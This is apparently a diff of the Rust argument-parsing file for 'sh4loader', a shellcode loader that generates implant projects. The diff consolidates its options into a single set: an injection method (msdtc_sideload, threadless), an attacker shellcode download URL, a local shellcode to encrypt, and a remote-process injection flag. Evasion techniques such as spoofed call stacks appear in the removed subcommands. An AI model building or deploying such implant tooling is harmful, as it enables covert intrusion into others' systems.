@@ -1,197 +1,39 @@
-use clap::{Parser, Subcommand};
+use clap::Parser;
 
+// sh4loader -m <method> -s <shellcode_path> -o <c_project_output> -u <url> -r/l
 #[derive(Parser, Debug)]
+#[command(author, version, about)]
 #[clap(
     name = "sh4loader",
-    version = "1.0",
     author = "sh4n4c1",
-    about = "shellcode loader"
+    version = "2.0",
 )]
 pub struct Args {
-    #[command(subcommand)]
-    pub cmd: Commands,
-}
-#[derive(Subcommand, Debug)]
-pub enum Commands {
-    /// Generate a common local injection
-    Common {
-        #[clap(
-            short = 'u',
-            long,
-            value_name = "url",
-            required = true,
-            help = "implant download shellcode url"
-        )]
-        shellcode_url: String,
-        #[clap(
-            short = 'o',
-            short,
-            long,
-            value_name = "output_path",
-            help = "implant project output path"
-        )]
-        output_path: String,
-        // change shellcode_path short name
-        #[clap(
-            short = 'p',
-            long,
-            value_name = "shellcode_path",
-            help = "the shellcode path"
-        )]
-        shellcode_path: String,
+    #[arg(short, long, help="injection method", value_name = "injection_method",
+        help="the implants injection method, choose one of the following methods:\n
+- msdtc_sideload 
+- threadless\n")]
+    pub method: String,
 
-        #[clap(
-            short = 'd',
-            long,
-            value_name = "debug",
-            help = "Implant debug mode",
-            required = false
-        )]
-        debug: bool,
-    },
-    /// Generate a Caro-Kann + Spoofstacks local injection
-    KannSpoofstacks {
-        #[clap(
-            short = 'u',
-            long,
-            value_name = "url",
-            required = true,
-            help = "implant download shellcode url"
-        )]
-        shellcode_url: String,
-        #[clap(
-            short = 'o',
-            short,
-            long,
-            value_name = "output_path",
-            help = "implant project output path"
-        )]
-        output_path: String,
-        // change shellcode_path short name
-        #[clap(
-            short = 'p',
-            long,
-            value_name = "shellcode_path",
-            help = "the shellcode path"
-        )]
-        shellcode_path: String,
+    #[arg(short = 'u' , long,
+        value_name = "shellcode_downloaded_url",
+        help="attacker shellcode download url, will be downloaded by the implants")]
+    pub shellcode_url: String,
 
-        #[clap(
-            short = 'd',
-            long,
-            value_name = "debug",
-            help = "Implant debug mode",
-            required = false
-        )]
-        debug: bool,
-    },
-    /// Generate a Spoofstacks local injection
-    Spoofstacks {
-        #[clap(
-            short = 'u',
-            long,
-            value_name = "url",
-            required = true,
-            help = "implant download shellcode url"
-        )]
-        shellcode_url: String,
-        #[clap(
-            short = 'o',
-            short,
-            long,
-            value_name = "output_path",
-            help = "implant project output path"
-        )]
-        output_path: String,
-        // change shellcode_path short name
-        #[clap(
-            short = 'p',
-            long,
-            value_name = "shellcode_path",
-            help = "the shellcode path"
-        )]
-        shellcode_path: String,
+    #[arg(short = 'p', long, value_name = "local_shellcode_path",
+    help="local shellcode path, will be encrypted
+the implants will download the encrypted shellcode")]
+    pub shellcode_path: String,
 
-        #[clap(
-            short = 'd',
-            long,
-            value_name = "debug",
-            help = "Implant debug mode",
-            required = false
-        )]
-        debug: bool,
-    },
-    /// Generate a Caro-Kann + Threadless injection
-    KannThreadless {
-        #[clap(
-            short = 'u',
-            long,
-            value_name = "url",
-            required = true,
-            help = "implant download shellcode url"
-        )]
-        shellcode_url: String,
-        #[clap(
-            short = 'o',
-            short,
-            long,
-            value_name = "output_path",
-            help = "implant project output path"
-        )]
-        output_path: String,
-        // change shellcode_path short name
-        #[clap(
-            short = 'p',
-            long,
-            value_name = "shellcode_path",
-            help = "the shellcode path"
-        )]
-        shellcode_path: String,
+    #[arg(short, long, help="implant project output path", value_name = "c_project_output",
+        help="the implants project output path")]
+    pub output_path: String,
 
-        #[clap(
-            short = 'd',
-            long,
-            value_name = "debug",
-            help = "Implant debug mode",
-            required = false
-        )]
-        debug: bool,
-    },
-    /// Generate a Caro-Kann + Threadless + Spoofstacks  injection
-    KannThreadlessStack {
-        #[clap(
-            short = 'u',
-            long,
-            value_name = "url",
-            required = true,
-            help = "implant download shellcode url"
-        )]
-        shellcode_url: String,
-        #[clap(
-            short = 'o',
-            short,
-            long,
-            value_name = "output_path",
-            help = "implant project output path"
-        )]
-        output_path: String,
-        // change shellcode_path short name
-        #[clap(
-            short = 'p',
-            long,
-            value_name = "shellcode_path",
-            help = "the shellcode path"
-        )]
-        shellcode_path: String,
+    #[arg(short = 'r', long, value_name = "remote injection", 
+        required = false, help = "inject into remote process")]
+    pub remote: bool,
 
-        // debug options
-        #[clap(
-            short = 'd',
-            long,
-            value_name = "debug",
-            help = "Implant debug mode",
-            required = false
-        )]
-        debug: bool,
-    },
+    #[arg(short = 'd', long, value_name = "implants debug model", 
+        required = false, help = "the implants trun on debug model, will print some information")]
+    pub implants_debug: bool,
 }
